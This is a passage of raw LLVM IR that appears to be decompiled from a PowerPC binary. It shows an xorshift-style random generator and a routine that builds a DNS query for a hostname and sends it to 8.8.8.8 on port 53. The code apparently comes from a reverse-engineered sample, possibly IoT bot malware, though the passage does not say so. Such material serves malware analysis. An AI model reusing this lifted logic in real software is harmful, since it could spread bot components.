  br i1 %v2_10007e34, label %dec_label_pc_10007e94, label %dec_label_pc_10007e38

dec_label_pc_10007e38:                            ; preds = %dec_label_pc_10007e6c, %dec_label_pc_10007de4
  %v0_10007e38 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10007e38, i32* %r12.global-to-local, align 4
  %v0_10007e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10007e3c, i32* %r29.global-to-local, align 4
  store i32 %v2_10007e64, i32* %r4.global-to-local, align 4
  %v0_10007e44.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10007e48.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007e44

dec_label_pc_10007e44:                            ; preds = %dec_label_pc_10007db8, %dec_label_pc_10007e38
  %v0_10007e78 = phi i32 [ %v3_10007dd8, %dec_label_pc_10007db8 ], [ %v0_10007e38, %dec_label_pc_10007e38 ]
  %v0_10007e4c = phi i32 [ %v3_10007dcc, %dec_label_pc_10007db8 ], [ %v2_10007e64, %dec_label_pc_10007e38 ]
  %v0_10007e48 = phi i32 [ %v3_10007ddc, %dec_label_pc_10007db8 ], [ %v0_10007e48.pre, %dec_label_pc_10007e38 ]
  %v0_10007e70 = phi i32 [ %v0_10007db0, %dec_label_pc_10007db8 ], [ %v0_10007e44.pre, %dec_label_pc_10007e38 ]
  %v1_10007e44 = icmp ult i32 %v0_10007e70, 3
  %v2_10007e44 = icmp ugt i32 %v0_10007e70, 3
  %v3_10007e44 = icmp eq i32 %v0_10007e70, 3
  store i1 %v1_10007e44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10007e44, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10007e44, i1* %cr7_eq.global-to-local, align 1
  %v1_10007e48 = mul i32 %v0_10007e48, 2048
  %v1_10007e4c = udiv i32 %v0_10007e4c, 524288
  %v2_10007e50 = xor i32 %v1_10007e48, %v0_10007e48
  %v2_10007e54 = xor i32 %v1_10007e4c, %v0_10007e4c
  %v0_10007e58 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e58 = add i32 %v0_10007e58, 1
  store i32 %v1_10007e58, i32* %r3.global-to-local, align 4
  %v2_10007e5c = xor i32 %v2_10007e54, %v2_10007e50
  %v1_10007e60 = udiv i32 %v2_10007e50, 256
  store i32 %v1_10007e60, i32* %r9.global-to-local, align 4
  %v2_10007e64 = xor i32 %v1_10007e60, %v2_10007e5c
  br i1 %v2_10007e44, label %dec_label_pc_10007de4, label %dec_label_pc_10007e6c

dec_label_pc_10007e6c:                            ; preds = %dec_label_pc_10007e44
  %v3_10007e64 = sext i32 %v2_10007e64 to i64
  %v2_10007e6c = load i32, i32* %r28.global-to-local, align 4
  %v4_10007e6c = zext i32 %v2_10007e6c to i64
  %v5_10007e6c = mul nuw nsw i64 %v4_10007e6c, %v3_10007e64
  %v1_10007e70 = add i32 %v0_10007e70, -1
  store i32 %v1_10007e70, i32* %r30.global-to-local, align 4
  %v1_10007e74 = icmp slt i32 %v1_10007e70, 0
  %v2_10007e74 = icmp sgt i32 %v1_10007e70, 0
  %v3_10007e74 = icmp eq i32 %v1_10007e70, 0
  store i1 %v1_10007e74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10007e74, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10007e74, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10007e78, i32* %r10.global-to-local, align 4
  %v1_10007e7c6 = udiv i64 %v5_10007e6c, 34359738368
  %v1_10007e7c = trunc i64 %v1_10007e7c6 to i32
  %tmp21 = mul i32 %v1_10007e7c, -33
  %v3_10007e84 = add i32 %tmp21, %v2_10007e64
  %v1_10007e88 = trunc i32 %v3_10007e84 to i8
  %v3_10007e88 = inttoptr i32 %v0_10007e58 to i8*
  store i8 %v1_10007e88, i8* %v3_10007e88, align 1
  %v0_10007e8c = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e8c = add i32 %v0_10007e8c, 1
  store i32 %v1_10007e8c, i32* %r31.global-to-local, align 4
  %v0_10007e90 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10007e90, label %dec_label_pc_10007e38, label %dec_label_pc_10007e94

dec_label_pc_10007e94:                            ; preds = %dec_label_pc_10007e6c, %dec_label_pc_10007de4
  store i32 %v2_10007e64, i32* @global_var_1001ebc8.172, align 4
  %v0_10007e98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10007e98, i32* @global_var_1001ebc4.174, align 4
  %v0_10007e9c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10007e9c, i32* @global_var_1001ebc0.175, align 4
  %v0_10007ea0 = load i32, i32* %r12.global-to-local, align 4
  store i32 %v0_10007ea0, i32* @global_var_1001ebbc.173, align 4
  %v0_10007ed0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007ea4

dec_label_pc_10007ea4:                            ; preds = %dec_label_pc_10007d68, %dec_label_pc_10007e94
  %v0_10007ed0 = phi i32 [ %v0_10007dac, %dec_label_pc_10007d68 ], [ %v0_10007ed0.pre, %dec_label_pc_10007e94 ]
  ret i32 %v0_10007ed0

; uselistorder directives
  uselistorder i32 %v1_10007e70, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10007e64, { 0, 1, 7, 5, 4, 3, 6, 2 }
  uselistorder i32 %v1_10007e60, { 1, 0 }
  uselistorder i32 %v2_10007e5c, { 1, 0 }
  uselistorder i32 %v0_10007e70, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10007e48, { 1, 0 }
  uselistorder i32 %v0_10007e4c, { 1, 0 }
  uselistorder i32 %v2_10007dfc, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 6, 1, 3, 4, 5, 7 }
  uselistorder i32* %r30.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r12.global-to-local, { 1, 0, 2, 3 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i1* %cr7_gt.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10007ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10007e44, { 1, 0 }
}

define i32 @function_10007ed4() local_unnamed_addr {
dec_label_pc_10007ed4:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %v0_10007ed4 = load i32, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_10007ed4, 1
  br i1 %tmp19, label %dec_label_pc_10007ed4.dec_label_pc_10007f88_crit_edge, label %dec_label_pc_10007eec

dec_label_pc_10007ed4.dec_label_pc_10007f88_crit_edge: ; preds = %dec_label_pc_10007ed4
  %v0_10007f98.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007f88

dec_label_pc_10007eec:                            ; preds = %dec_label_pc_10007ed4
  %v3_10007efc = load i32, i32* @global_var_1001ebc8.172, align 4
  store i32 %v3_10007efc, i32* %r7.global-to-local, align 4
  %v3_10007f00 = load i32, i32* @global_var_1001ebc4.174, align 4
  store i32 %v3_10007f00, i32* %r5.global-to-local, align 4
  %v3_10007f04 = load i32, i32* @global_var_1001ebc0.175, align 4
  store i32 %v3_10007f04, i32* %r6.global-to-local, align 4
  %v3_10007f08 = load i32, i32* @global_var_1001ebbc.173, align 4
  br label %dec_label_pc_10007f34

dec_label_pc_10007f10:                            ; preds = %dec_label_pc_10007f34
  %v1_10007f10 = load i32, i32* @r3, align 4
  %v2_10007f10 = inttoptr i32 %v1_10007f10 to i32*
  store i32 %v2_10007f58, i32* %v2_10007f10, align 4
  %v0_10007f14 = load i32, i32* @r4, align 4
  %v1_10007f14 = add i32 %v0_10007f14, -4
  store i32 %v1_10007f14, i32* @r4, align 4
  %v0_10007f18 = load i32, i32* @r3, align 4
  %v1_10007f18 = add i32 %v0_10007f18, 4
  br label %dec_label_pc_10007f1c

dec_label_pc_10007f1c:                            ; preds = %dec_label_pc_10007f6c, %dec_label_pc_10007f10
  %v0_10007f1c = phi i32 [ %v0_10007f1c.pr, %dec_label_pc_10007f6c ], [ %v1_10007f14, %dec_label_pc_10007f10 ]
  %storemerge = phi i32 [ %v1_10007f70, %dec_label_pc_10007f6c ], [ %v1_10007f18, %dec_label_pc_10007f10 ]
  store i32 %storemerge, i32* @r3, align 4
  %v0_10007f20 = load i32, i32* %r6.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10007f1c, 1
  br i1 %tmp20, label %dec_label_pc_10007f78, label %dec_label_pc_10007f28

dec_label_pc_10007f28:                            ; preds = %dec_label_pc_10007f1c
  %v0_10007f28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10007f28, i32* %r6.global-to-local, align 4
  %v0_10007f2c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10007f2c, i32* %r5.global-to-local, align 4
  %v0_10007f30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10007f30, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007eec, %dec_label_pc_10007f28
  %v0_10007fd4 = phi i32 [ %v3_10007f04, %dec_label_pc_10007eec ], [ %v0_10007f28, %dec_label_pc_10007f28 ]
  %v0_10007fb8 = phi i32 [ %v3_10007f00, %dec_label_pc_10007eec ], [ %v0_10007f2c, %dec_label_pc_10007f28 ]
  %v0_10007fbc = phi i32 [ %v3_10007efc, %dec_label_pc_10007eec ], [ %v0_10007f30, %dec_label_pc_10007f28 ]
  %v0_10007f9c = phi i32 [ %v3_10007f08, %dec_label_pc_10007eec ], [ %v0_10007f20, %dec_label_pc_10007f28 ]
  %v0_10007f64 = phi i32 [ %v0_10007ed4, %dec_label_pc_10007eec ], [ %v0_10007f1c, %dec_label_pc_10007f28 ]
  %v2_10007f34 = icmp sgt i32 %v0_10007f64, 3
  %v1_10007f38 = mul i32 %v0_10007f9c, 2048
  %v1_10007f3c = udiv i32 %v0_10007fbc, 524288
  %v2_10007f40 = xor i32 %v1_10007f38, %v0_10007f9c
  %v2_10007f44 = xor i32 %v1_10007f3c, %v0_10007fbc
  %v2_10007f4c = xor i32 %v2_10007f44, %v2_10007f40
  %v1_10007f50 = udiv i32 %v2_10007f40, 256
  %v2_10007f58 = xor i32 %v2_10007f4c, %v1_10007f50
  store i32 %v2_10007f58, i32* %r0.global-to-local, align 4
  br i1 %v2_10007f34, label %dec_label_pc_10007f10, label %dec_label_pc_10007f60

dec_label_pc_10007f60:                            ; preds = %dec_label_pc_10007f34
  %v3_10007f48 = icmp eq i32 %v0_10007f64, 1
  store i32 %v2_10007f58, i32* %r0.global-to-local, align 4
  %v1_10007f64 = add i32 %v0_10007f64, -2
  store i32 %v1_10007f64, i32* @r4, align 4
  br i1 %v3_10007f48, label %dec_label_pc_10007f9c, label %dec_label_pc_10007f6c

dec_label_pc_10007f6c:                            ; preds = %dec_label_pc_10007f60
  %v1_10007f6c = trunc i32 %v2_10007f58 to i16
  %v2_10007f6c = load i32, i32* @r3, align 4
  %v3_10007f6c = inttoptr i32 %v2_10007f6c to i16*
  store i16 %v1_10007f6c, i16* %v3_10007f6c, align 2
  %v0_10007f70 = load i32, i32* @r3, align 4
  %v1_10007f70 = add i32 %v0_10007f70, 2
  %v0_10007f1c.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007f1c

dec_label_pc_10007f78:                            ; preds = %dec_label_pc_10007f1c
  %v0_10007f78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10007f78, i32* @global_var_1001ebc8.172, align 4
  %v0_10007f7c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10007f7c, i32* @global_var_1001ebc4.174, align 4
  %v0_10007f80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10007f80, i32* @global_var_1001ebc0.175, align 4
  store i32 %v0_10007f20, i32* @global_var_1001ebbc.173, align 4
  br label %dec_label_pc_10007f88

dec_label_pc_10007f88:                            ; preds = %dec_label_pc_10007ed4.dec_label_pc_10007f88_crit_edge, %dec_label_pc_10007f78
  %v0_10007f98 = phi i32 [ %v0_10007f98.pre, %dec_label_pc_10007ed4.dec_label_pc_10007f88_crit_edge ], [ %storemerge, %dec_label_pc_10007f78 ]
  ret i32 %v0_10007f98

dec_label_pc_10007f9c:                            ; preds = %dec_label_pc_10007f60
  store i32 %v2_10007f58, i32* %r0.global-to-local, align 4
  store i32 %v0_10007fb8, i32* @global_var_1001ebc0.175, align 4
  store i32 %v0_10007fbc, i32* @global_var_1001ebc4.174, align 4
  store i32 %v2_10007f58, i32* @global_var_1001ebc8.172, align 4
  store i32 %v0_10007fd4, i32* @global_var_1001ebbc.173, align 4
  %v1_10007fd8 = trunc i32 %v2_10007f58 to i8
  %v2_10007fd8 = load i32, i32* @r3, align 4
  %v3_10007fd8 = inttoptr i32 %v2_10007fd8 to i8*
  store i8 %v1_10007fd8, i8* %v3_10007fd8, align 1
  %v0_10007fdc = load i32, i32* @r3, align 4
  ret i32 %v0_10007fdc

; uselistorder directives
  uselistorder i32 %v2_10007f58, { 2, 1, 0, 3, 4, 6, 5 }
  uselistorder i32 %v0_10007f9c, { 1, 0 }
  uselistorder i32 %v0_10007fbc, { 1, 2, 0 }
  uselistorder i32 %v0_10007ed4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_10007f88, { 1, 0 }
  uselistorder label %dec_label_pc_10007f34, { 1, 0 }
}

define i32 @function_10007fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007fe0:
  store i32 %arg1, i32* @r31, align 4
  %v3_10007fec = icmp eq i32 %arg1, 0
  br i1 %v3_10007fec, label %dec_label_pc_10008010, label %dec_label_pc_10007ff8

dec_label_pc_10007ff8:                            ; preds = %dec_label_pc_10007fe0
  %v1_10007ff8 = add i32 %arg1, 4
  %v2_10007ff8 = inttoptr i32 %v1_10007ff8 to i32*
  %v3_10007ff8 = load i32, i32* %v2_10007ff8, align 4
  store i32 %v3_10007ff8, i32* @r3, align 4
  %v3_10007ffc = icmp eq i32 %v3_10007ff8, 0
  br i1 %v3_10007ffc, label %dec_label_pc_10008008, label %dec_label_pc_10008004

dec_label_pc_10008004:                            ; preds = %dec_label_pc_10007ff8
  store i32 268468232, i32* @lr, align 4
  %v0_10008004 = call i32 @function_1000c5b8()
  %v0_10008008.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008008

dec_label_pc_10008008:                            ; preds = %dec_label_pc_10007ff8, %dec_label_pc_10008004
  %v0_10008008 = phi i32 [ %arg1, %dec_label_pc_10007ff8 ], [ %v0_10008008.pre, %dec_label_pc_10008004 ]
  store i32 %v0_10008008, i32* @r3, align 4
  store i32 268468240, i32* @lr, align 4
  %v0_1000800c = call i32 @function_1000c5b8()
  br label %dec_label_pc_10008010

dec_label_pc_10008010:                            ; preds = %dec_label_pc_10007fe0, %dec_label_pc_10008008
  %v0_10008020 = phi i32 [ 0, %dec_label_pc_10007fe0 ], [ %v0_1000800c, %dec_label_pc_10008008 ]
  ret i32 %v0_10008020

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10008010, { 1, 0 }
  uselistorder label %dec_label_pc_10008008, { 1, 0 }
}

define i32 @function_10008024(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008024:
  %cr4_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4308 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-2096 = alloca i32, align 4
  %stack_var_-2108 = alloca i16, align 2
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-4300 = alloca i32, align 4
  %stack_var_-4143 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %v0_10008028 = load i32, i32* @lr, align 4
  store i32 %v0_10008028, i32* %r0.global-to-local, align 4
  %v0_1000802c = call i32 @__asm_mfcr()
  %v0_10008034 = load i32, i32* @r29, align 4
  store i32 %v0_1000802c, i32* @r29, align 4
  %v2_10008048 = ptrtoint i32* %stack_var_-4156 to i32
  %v2_10008050 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v2_10008050, i32* %r26.global-to-local, align 4
  %v0_10008054 = load i32, i32* %r0.global-to-local, align 4
  %v0_10008074 = load i32, i32* @r28, align 4
  store i32 268468356, i32* @lr, align 4
  %v2_10008080 = call i32 @function_1000c548(i32 1, i32 8)
  store i32 %v2_10008080, i32* %r25.global-to-local, align 4
  %v0_10008088 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008090.177 to i32), i32* @lr, align 4
  %v1_1000808c = inttoptr i32 %v0_10008088 to i8*
  %v2_1000808c = call i32 @function_1000ab64(i8* %v1_1000808c)
  %v2_10008090 = ptrtoint i32* %stack_var_-4143 to i32
  store i32 %v2_10008090, i32* %r10.global-to-local, align 4
  %v1_10008094 = add i32 %v2_1000808c, 1
  store i32 %v2_10008050, i32* %r7.global-to-local, align 4
  %v1_100080a0 = add i32 %v2_1000808c, 2
  store i32 %v1_100080a0, i32* %ctr.global-to-local, align 4
  %tmp94 = icmp sgt i32 %v1_10008094, -1
  br i1 %tmp94, label %dec_label_pc_100080c8.preheader, label %dec_label_pc_100080c8.preheader.thread

dec_label_pc_100080c8.preheader:                  ; preds = %dec_label_pc_10008024
  %v3_1000809c = icmp eq i32 %v1_10008094, 0
  %v1_100080c813 = or i32 %v2_10008090, 1
  store i32 %v1_100080c813, i32* %r11.global-to-local, align 4
  store i32 %v1_10008094, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000809c, label %dec_label_pc_100080f8, label %dec_label_pc_100080d0.lr.ph

dec_label_pc_100080d0.lr.ph:                      ; preds = %dec_label_pc_100080c8.preheader
  %v0_100080d0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100080d0

dec_label_pc_100080b4:                            ; preds = %dec_label_pc_100080e0
  %v3_100080b4 = inttoptr i32 %v2_100080b4 to i8*
  store i8 %v2_100080d0, i8* %v3_100080b4, align 1
  %v0_100080b8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100080b8 = urem i32 %v0_100080b8, 256
  %v0_100080bc = load i32, i32* %r10.global-to-local, align 4
  %v1_100080bc = add i32 %v0_100080bc, 1
  store i32 %v1_100080bc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100080c0

dec_label_pc_100080c0:                            ; preds = %dec_label_pc_100080e8, %dec_label_pc_100080b4
  %v0_100080c4 = phi i32 [ %v0_100080c4.pre, %dec_label_pc_100080e8 ], [ %v1_100080bc, %dec_label_pc_100080b4 ]
  %v0_100080e020 = phi i32 [ 0, %dec_label_pc_100080e8 ], [ %v1_100080b8, %dec_label_pc_100080b4 ]
  %v0_100080c0 = load i32, i32* @r29, align 4
  %v1_100080c0 = add i32 %v0_100080c0, 1
  store i32 %v1_100080c0, i32* @r29, align 4
  store i32 %v0_100080c4, i32* %r10.global-to-local, align 4
  %v1_100080c8 = add i32 %v0_100080c4, 1
  store i32 %v1_100080c8, i32* %r11.global-to-local, align 4
  %v0_100080cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100080cc = add i32 %v0_100080cc, -1
  store i32 %v1_100080cc, i32* %ctr.global-to-local, align 4
  %v2_100080cc = icmp eq i32 %v1_100080cc, 0
  br i1 %v2_100080cc, label %dec_label_pc_100080f8, label %dec_label_pc_100080d0

dec_label_pc_100080d0:                            ; preds = %dec_label_pc_100080d0.lr.ph, %dec_label_pc_100080c0
  %v2_100080b4 = phi i32 [ %v2_10008090, %dec_label_pc_100080d0.lr.ph ], [ %v0_100080c4, %dec_label_pc_100080c0 ]
  %v0_100080e8 = phi i32 [ 0, %dec_label_pc_100080d0.lr.ph ], [ %v0_100080e020, %dec_label_pc_100080c0 ]
  %v0_100080d0 = phi i32 [ %v0_100080d0.pre, %dec_label_pc_100080d0.lr.ph ], [ %v1_100080c0, %dec_label_pc_100080c0 ]
  %v1_100080d0 = inttoptr i32 %v0_100080d0 to i8*
  %v2_100080d0 = load i8, i8* %v1_100080d0, align 1
  %v3_100080d0 = zext i8 %v2_100080d0 to i32
  store i32 %v3_100080d0, i32* %r0.global-to-local, align 4
  %v3_100080d4 = icmp eq i8 %v2_100080d0, 46
  br i1 %v3_100080d4, label %dec_label_pc_100080e8, label %dec_label_pc_100080e0

dec_label_pc_100080e0:                            ; preds = %dec_label_pc_100080d0
  %v3_100080d8 = icmp eq i8 %v2_100080d0, 0
  %v1_100080e0 = add nsw i32 %v0_100080e8, 1
  store i32 %v1_100080e0, i32* %r9.global-to-local, align 4
  br i1 %v3_100080d8, label %dec_label_pc_100080e8, label %dec_label_pc_100080b4

dec_label_pc_100080e8:                            ; preds = %dec_label_pc_100080e0, %dec_label_pc_100080d0
  %v1_100080e8 = trunc i32 %v0_100080e8 to i8
  %v2_100080e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_100080e8 = inttoptr i32 %v2_100080e8 to i8*
  store i8 %v1_100080e8, i8* %v3_100080e8, align 1
  %v0_100080ec = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100080ec, i32* %r7.global-to-local, align 4
  %v0_100080c4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100080c0

dec_label_pc_100080f8:                            ; preds = %dec_label_pc_100080c0, %dec_label_pc_100080c8.preheader.thread, %dec_label_pc_100080c8.preheader
  %v2_10008100 = phi i32 [ %v2_10008090, %dec_label_pc_100080c8.preheader ], [ %v2_10008090, %dec_label_pc_100080c8.preheader.thread ], [ %v0_100080c4, %dec_label_pc_100080c0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10008100 = inttoptr i32 %v2_10008100 to i8*
  store i8 0, i8* %v3_10008100, align 1
  %v2_10008104 = ptrtoint i32* %stack_var_-4300 to i32
  store i32 -1, i32* @r30, align 4
  store i32 1, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008114.178 to i32), i32* @lr, align 4
  %v1_10008110 = bitcast i32* %stack_var_-4144 to i8*
  %v2_10008110 = call i32 @function_1000ab64(i8* %v1_10008110)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10008118 = load i32, i32* %r26.global-to-local, align 4
  %v2_10008118 = add i32 %v0_10008118, %v2_10008110
  store i32 %v2_10008118, i32* %r29.global-to-local, align 4
  %v0_10008124 = load i32, i32* @r30, align 4
  %v3_10008124 = icmp eq i32 %v0_10008124, -1
  store i1 %v3_10008124, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-4300, align 4
  %v2_1000812c = ptrtoint i32* %stack_var_-4284 to i32
  store i32 %v2_1000812c, i32* @r31, align 4
  %v2_10008134 = ptrtoint i16* %stack_var_-2108 to i32
  store i32 %v2_10008134, i32* %r19.global-to-local, align 4
  store i32 268468544, i32* @lr, align 4
  %v2_1000813c = call i32 @function_1000ab64(i8* %v1_10008110)
  %v1_10008140 = add i32 %v2_1000813c, 17
  store i32 %v1_10008140, i32* %r23.global-to-local, align 4
  %v0_10008144 = call i32 @function_10007ca8()
  %v1_10008144 = sext i32 %v0_10008144 to i64
  store i32 16, i32* @r4, align 4
  %v5_10008158 = mul nuw nsw i64 %v1_10008144, 2147516417
  store i32 %v2_10008104, i32* @r3, align 4
  %v2_10008160 = ptrtoint i32* %stack_var_-2096 to i32
  store i32 %v2_10008160, i32* %r20.global-to-local, align 4
  %v1_100081642 = udiv i64 %v5_10008158, 140737488355328
  %v1_10008164 = trunc i64 %v1_100081642 to i32
  store i32 %v1_10008164, i32* %r0.global-to-local, align 4
  %v2_10008168 = add i32 %v1_10008164, %v0_10008144
  store i32 %v2_10008168, i32* %r9.global-to-local, align 4
  %v1_1000816c = urem i32 %v2_10008168, 65536
  store i32 %v1_1000816c, i32* %r22.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008174.180 to i32), i32* @lr, align 4
  %v0_10008170 = call i32 @function_1000ac0c()
  store i32 2, i32* %stack_var_-4300, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 134744072, i32* %r11.global-to-local, align 4
  %v0_10008188 = load i32, i32* %r29.global-to-local, align 4
  store i32 53, i32* %r9.global-to-local, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v0_100081a0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100081a0, i32* %stack_var_-4156, align 4
  %v3_100081a8 = add i32 %v0_10008188, 3
  %v4_100081a8 = inttoptr i32 %v3_100081a8 to i16*
  store i16 1, i16* %v4_100081a8, align 2
  %v0_100081ac = load i32, i32* %r10.global-to-local, align 4
  %v1_100081ac = trunc i32 %v0_100081ac to i16
  %v2_100081ac = load i32, i32* %r29.global-to-local, align 4
  %v3_100081ac = add i32 %v2_100081ac, 1
  %v4_100081ac = inttoptr i32 %v3_100081ac to i16*
  store i16 %v1_100081ac, i16* %v4_100081ac, align 2
  %v2_10008250 = ptrtoint i32* %stack_var_-4312 to i32
  %v2_10008284 = ptrtoint i32* %stack_var_-4308 to i32
  %v1_10008374 = bitcast i32* %stack_var_-2096 to i8*
  %v4_1000838c = zext i16 %tmp60 to i32
  %v3_10008390 = icmp eq i16 %tmp60, 0
  br label %dec_label_pc_100081b0

dec_label_pc_100081b0:                            ; preds = %dec_label_pc_100082f0, %dec_label_pc_100080f8
  %v0_100081b0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100081b0, label %dec_label_pc_100081bc, label %dec_label_pc_100081b4

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_100081b0
  store i32 ptrtoint ([3 x i8]* @global_var_100081bc.181 to i32), i32* @lr, align 4
  %v0_100081b8 = call i32 @function_1000b3f0()
  br label %dec_label_pc_100081bc

dec_label_pc_100081bc:                            ; preds = %dec_label_pc_100081b0, %dec_label_pc_100081b4
  store i32 268468684, i32* @lr, align 4
  %v3_100081c8 = call i32 @function_1000c1bc(i32 2, i32 2, i32 0)
  store i32 %v3_100081c8, i32* @r3, align 4
  %v3_100081cc = icmp eq i32 %v3_100081c8, -1
  store i1 %v3_100081cc, i1* %cr4_eq.global-to-local, align 1
  store i32 %v3_100081c8, i32* @r30, align 4
  br i1 %v3_100081cc, label %dec_label_pc_100082f8, label %dec_label_pc_100081d8

dec_label_pc_100081d8:                            ; preds = %dec_label_pc_100081bc
  store i32 268468708, i32* @lr, align 4
  %v0_100081e0 = call i32 @function_1000bfbc()
  %v3_100081e4 = icmp eq i32 %v0_100081e0, -1
  br i1 %v3_100081e4, label %dec_label_pc_100082f8, label %dec_label_pc_100081ec

dec_label_pc_100081ec:                            ; preds = %dec_label_pc_100081d8
  %v0_100081ec = load i32, i32* @r30, align 4
  %v0_100081f4 = load i32, i32* %r23.global-to-local, align 4
  store i32 268468736, i32* @lr, align 4
  %v4_100081fc = call i32 @function_1000c108(i32 %v0_100081ec, i32 %v2_10008048, i32 %v0_100081f4, i32 16384)
  %v3_10008200 = icmp eq i32 %v4_100081fc, -1
  br i1 %v3_10008200, label %dec_label_pc_100082f8, label %dec_label_pc_10008208

dec_label_pc_10008208:                            ; preds = %dec_label_pc_100081ec
  %v0_10008208 = load i32, i32* @r30, align 4
  store i32 %v0_10008208, i32* @r4, align 4
  store i32 268468764, i32* @lr, align 4
  %v2_10008218 = call i32 @function_1000b2c0(i32 3)
  %v0_1000821c = load i32, i32* @r30, align 4
  store i32 %v0_1000821c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10008230.182 to i32), i32* @lr, align 4
  %v2_1000822c = call i32 @function_1000b2c0(i32 4)
  store i32 32, i32* %r0.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10008240141 = load i32, i32* @r31, align 4
  %v4_10008240143 = inttoptr i32 %v2_10008240141 to i32*
  store i32 0, i32* %v4_10008240143, align 4
  %v0_10008244144 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008244145 = add i32 %v0_10008244144, 4
  store i32 %v1_10008244145, i32* %r9.global-to-local, align 4
  %v0_10008248146 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008248147 = add i32 %v0_10008248146, -1
  store i32 %v1_10008248147, i32* %ctr.global-to-local, align 4
  %v2_10008248148 = icmp eq i32 %v1_10008248147, 0
